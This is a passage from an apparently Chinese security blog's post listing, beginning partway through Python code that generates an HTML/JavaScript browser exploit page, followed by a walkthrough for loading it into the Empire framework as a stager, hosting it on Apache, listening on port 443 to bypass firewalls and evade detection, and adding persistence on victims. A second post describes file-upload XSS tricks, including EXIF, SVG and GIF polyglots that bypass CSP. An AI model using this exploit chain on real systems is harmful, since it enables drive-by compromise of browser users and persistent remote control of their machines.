+= <span class="string">"        &#123;\n"</span></div><div class="line">			code += <span class="string">"            return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n"</span></div><div class="line">			code += <span class="string">"        &#125;\n"</span></div><div class="line">			code += <span class="string">"        function intToStr(x)\n"</span></div><div class="line">			code += <span class="string">"        &#123;\n"</span></div><div class="line">			code += <span class="string">"            return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n"</span></div><div class="line">			code += <span class="string">"        &#125;\n"</span></div><div class="line">			code += <span class="string">"        var o;\n"</span></div><div class="line">			code += <span class="string">"        o = &#123;\"valueOf\": function () &#123;\n"</span></div><div class="line">			code += <span class="string">"                triggerBug();\n"</span></div><div class="line">			code += <span class="string">"                return 1;\n"</span></div><div class="line">			code += <span class="string">"            &#125;&#125;;\n"</span></div><div class="line">			code += <span class="string">"        setTimeout(function() &#123;exploit(o);&#125;, 50);\n"</span></div><div class="line">			code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/body&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/html&gt;"</span></div><div class="line"></div><div class="line">	<span class="keyword">return</span> code</div></pre></td></tr></table></figure>
<p>ms16.py</p>
<p>首先我们可以从<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="external">Github</a>获取Empire</p>
<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/1.png?resize=661%2C418&amp;ssl=1" alt="Empire Downloading"></p>
<p>现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。</p>
<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/2.png?resize=661%2C418&amp;ssl=1" alt="Installing Apache2"><br>接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。</p>
<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/3.png?resize=661%2C418&amp;ssl=1" alt="Empire Installation"><br>现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。</p>
<p>我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。</p>
<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/4.png?resize=925%2C546&amp;ssl=1" alt="Empire Listener"><br>现在去生成我们的恶意HTML</p>
<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/5.png?resize=925%2C546&amp;ssl=1" alt="Stager Generation"></p>
<p>现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。</p>
<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/7.png?resize=925%2C546&amp;ssl=1" alt="New Agent"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/XSS姿势——文件上传XSS/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/XSS姿势——文件上传XSS/" itemprop="url">
                  XSS姿势——文件上传XSS
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:20:58+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/XSS姿势——文件上传XSS/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/XSS姿势——文件上传XSS/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/XSS姿势——文件上传XSS/" class="leancloud_visitors" data-flag-title="XSS姿势——文件上传XSS">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h1><hr>
<p>一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。</p>
<h1 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h1><hr>
<p>首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。</p>
<h3 id="姿势一：文件名方式"><a href="#姿势一：文件名方式" class="headerlink" title="姿势一：文件名方式"></a>姿势一：文件名方式</h3><p>文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。</p>
<p><img src="http://static.wooyun.org/upload/image/201604/2016041510130259461.gif" alt="p1"></p>
<p>虽然我没有准备靶场，但是你可以选择在<a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value" target="_blank" rel="external">W3Schools</a>练习这种XSS 。</p>
<h3 id="姿势二：Metadata"><a href="#姿势二：Metadata" class="headerlink" title="姿势二：Metadata"></a>姿势二：Metadata</h3><p>使用<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="external">exiftool</a>这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：</p>
<p>例如：</p>
<p><img src="http://static.wooyun.org//drops/20160414/2016041415305935841.jpg" alt="p2"></p>
<h3 id="姿势三：Content"><a href="#姿势三：Content" class="headerlink" title="姿势三：Content"></a>姿势三：Content</h3><p>如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS：</p>
<p>一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果</p>
<h3 id="姿势四：Source"><a href="#姿势四：Source" class="headerlink" title="姿势四：Source"></a>姿势四：Source</h3><p>建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击<code>alert(1)</code>）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。</p>
<p><img src="http://static.wooyun.org//drops/20160415/2016041501523324712.gif" alt="p3"></p>
<p>要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名：</p>
<p>这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。</p>
<p>正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。</p>
<p><img src="http://static.wooyun.org//drops/20160414/2016041415280360223pic42.png" alt="p4"></p>
<h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><hr>
<p>如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。</p>
<p>也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是<a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="external">here</a></p>
<p>原文链接：<a href="http://brutelogic.com.br/blog/" target="_blank" rel="external">http://brutelogic.com.br/blog/</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>


          
          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="ZEROYU" />
          <p class="site-author-name" itemprop="name">ZEROYU</p>
          <p class="site-description motion-element" itemprop="description">一只单线程HACKER</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">34</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          

          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/zer0yu" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/Z3r0yu" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  Weibo
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="zeroyu.xyz@gmail.com" target="_blank" title="Email">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Email
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              友情链接
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="http://blog.csdn.net/zeroyu_xyz" title="我的CSDN博客" target="_blank">我的CSDN博客</a>
                </li>
              
            </ul>
          </div>
        

        


      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2015 - 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZEROYU</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">ZEROYU</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>


<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<script>
(function(){
    var bp = document.createElement('script');
    bp.src = '//push.zhanzhang.baidu.com/push.js';
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  

  
    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"zeroyu.duoshuo.com"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.id = 'duoshuo-script';
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>

  
    
    
    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
    <script src="/js/src/hook-duoshuo.js"></script>
  












  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".popoverlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  

  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("KY6fzHpNYVDAlWLyfhKdz5OA-gzGzoHsz", "IlxIqswmBd92jfiSvOIQSLf5");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  


</body>
</html>
